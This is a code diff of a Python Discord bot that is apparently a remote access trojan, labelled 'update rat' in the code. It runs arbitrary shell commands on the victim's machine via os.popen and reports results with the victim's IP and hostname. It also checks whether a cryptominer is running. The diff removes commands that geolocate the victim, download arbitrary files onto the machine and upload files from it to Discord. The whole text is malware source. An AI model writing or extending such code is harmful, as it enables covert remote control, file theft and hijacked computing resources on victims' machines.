@@ -47,28 +47,9 @@ async def exit(ctx):
     await ctx.send(f"``[-] {ip}@{hostname}: Session closed``")
     sys.exit()
 
-# info
-@bot.command()
-async def info(ctx):    
-    link = f"https://ifconfig.co/json?ip={ip}"
-    f = requests.get(link)
-    await ctx.send(f"```json\n{f.text}```")
-
 # shell
 @bot.command()
 async def shell(ctx, *args):
-    arguments = ' '.join(args)
-    stream = os.popen(arguments)
-    output = stream.read()
-    
-    if sys.getsizeof(output) > 2000:
-        await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
-    else:
-        await ctx.send(f"``[+] {ip}@{hostname}: Command executed`` ```{output}```")
-
-# self shell
-@bot.command(name=f"shell.{hostname}@{ip}")
-async def selfshell(ctx, *args):
     arguments = ' '.join(args)
     stream = os.popen(arguments)
     output = stream.read()
@@ -85,27 +66,6 @@ async def check(ctx):
         await ctx.send(f"``[+] {ip}@{hostname}: Miner running``")
     else:
         await ctx.send(f"``[-] {ip}@{hostname}: Miner not running``")
-
-# download
-@bot.command()
-async def download(ctx, arg1, arg2):
-    link = ''.join(arg1)
-    name = ''.join(arg2)
-    
-    url = link
-    r = requests.get(url, allow_redirects=True)
-    open(name, 'wb').write(r.content)
-    
-    if os.path.exists(name):
-        await ctx.send(f"``[+] {ip}@{hostname}: File downloaded``")
-    else:
-        await ctx.send(f"``[-] {ip}@{hostname}: File not downloaded``")
-
-# upload
-@bot.command()
-async def upload(ctx, arg1):
-    path = ''.join(arg1)
-    await ctx.send(f"``[+] {ip}@{hostname}: File uploaded``",file=discord.File(path))
 
 # update rat
 @bot.command()
